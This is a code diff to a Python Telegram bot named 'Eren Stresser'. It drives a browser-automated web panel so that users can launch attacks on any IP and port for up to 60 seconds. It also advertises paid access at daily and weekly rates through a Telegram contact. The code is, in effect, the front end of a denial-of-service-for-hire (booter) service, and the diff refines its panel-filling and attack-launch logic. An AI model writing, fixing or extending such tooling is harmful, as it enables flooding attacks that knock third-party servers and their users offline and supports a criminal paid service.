@@ -9,7 +9,6 @@ from telegram import Update
 from telegram.ext import (
     Application,
     CommandHandler,
-    MessageHandler,
     filters,
     ContextTypes,
 )
@@ -81,14 +80,14 @@ def init_browser():
         options.add_argument("--disable-gpu")
         options.add_argument("--window-size=1366,768")
 
-        # Auto detect Chrome version
-        driver = uc.Chrome(options=options, version_main=None)  # Auto detect
+        # Fix for version 148
+        driver = uc.Chrome(options=options, version_main=148)
         wait = WebDriverWait(driver, 25)
 
         logger.info("🌐 Opening panel...")
         driver.get(PANEL_URL)
-        time.sleep(10)
-        logger.info("✅ Browser Ready!")
+        time.sleep(12)  # Extra time for full load
+        logger.info("✅ Panel Loaded!")
     except Exception as e:
         logger.error(f"Browser Error: {e}")
         raise
@@ -99,40 +98,44 @@ async def send_attack(ip: str, port: str, seconds: int):
         init_browser()
 
     try:
-        # IP Field
-        ip_field = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[placeholder*='70.70']")))
+        # IP Field (Target)
+        ip_field = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[placeholder*='78'], input[placeholder*='70']")))
         ip_field.clear()
         ip_field.send_keys(ip)
 
-        # Port & Time Fields (both are number inputs)
-        number_fields = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input[type='number']")))
-        number_fields[0].clear()
-        number_fields[0].send_keys(port)
+        # Port Field
+        port_field = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input[type='number']")))[0]
+        port_field.clear()
+        port_field.send_keys(port)
 
+        # Duration Field
         if seconds > MAX_TIME:
             seconds = MAX_TIME
-        number_fields[1].clear()
-        number_fields[1].send_keys(str(seconds))
+        duration_field = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input[type='number']")))[1]
+        duration_field.clear()
+        duration_field.send_keys(str(seconds))
 
-        # Launch Button
-        launch_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Launch') or contains(., 'Attack')]")))
+        # Launch Attack Button
+        launch_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Launch Attack') or contains(., 'Launch')]")))
         launch_btn.click()
 
-        return True, f"✅ **Attack Started**\n`{ip}:{port}` - {seconds}s"
+        return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"
 
     except Exception as e:
-        return False, f"❌ Error: {str(e)}"
+        logger.error(f"Attack failed: {e}")
+        return False, f"❌ Error filling panel: {str(e)}"
 
 # ==================== COMMANDS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 **Eren Stresser Bot**\n\nUse: `/eren <ip> <port> [time]`", 
-        parse_mode="Markdown"
+    text = (
+        "👋 **Welcome to Eren Stresser!** 🚀\n\n"
+        "`/eren <ip> <port> [time]` - Max 60 seconds"
     )
+    await update.message.reply_text(text, parse_mode="Markdown")
 
 async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 2:
-        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [time]`", parse_mode="Markdown")
+        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
         return
 
     ip = context.args[0]
@@ -140,21 +143,21 @@ async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
     seconds = int(context.args[2]) if len(context.args) > 2 else DEFAULT_TIME
 
     if seconds < 10 or seconds > MAX_TIME:
-        await update.message.reply_text("❌ Time must be 10-60 seconds.", parse_mode="Markdown")
+        await update.message.reply_text("❌ Time must be between 10-60 seconds.", parse_mode="Markdown")
         return
 
-    msg = await update.message.reply_text("🔄 **Launching Attack...**", parse_mode="Markdown")
+    msg = await update.message.reply_text("🔄 **Filling Panel...**", parse_mode="Markdown")
     success, result = await send_attack(ip, port, seconds)
 
     if success:
         await msg.edit_text(result, parse_mode="Markdown")
         await asyncio.sleep(seconds + 5)
-        await update.message.reply_text(f"🏁 **Attack Finished**", parse_mode="Markdown")
+        await update.message.reply_text(f"🏁 **Attack Finished** `{ip}:{port}`", parse_mode="Markdown")
     else:
         await msg.edit_text(result, parse_mode="Markdown")
 
 async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("💰 **Pricing**\n1 Day = 50₹\n7 Days = 300₹\nDM @LFX_EREN", parse_mode="Markdown")
+    await update.message.reply_text("💰 **Pricing**\n• 1 Day → 50₹\n• 7 Days → 300₹\nDM @LFX_EREN")
 
 def main():
     app = Application.builder().token(TOKEN).build()
@@ -163,8 +166,8 @@ def main():
     app.add_handler(CommandHandler("price", price))
     app.add_handler(CommandHandler("help", start))
 
-    print("🤖 Bot Started...")
-    app.run_polling()
+    print("🤖 Bot Started - Trying to connect Chrome...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
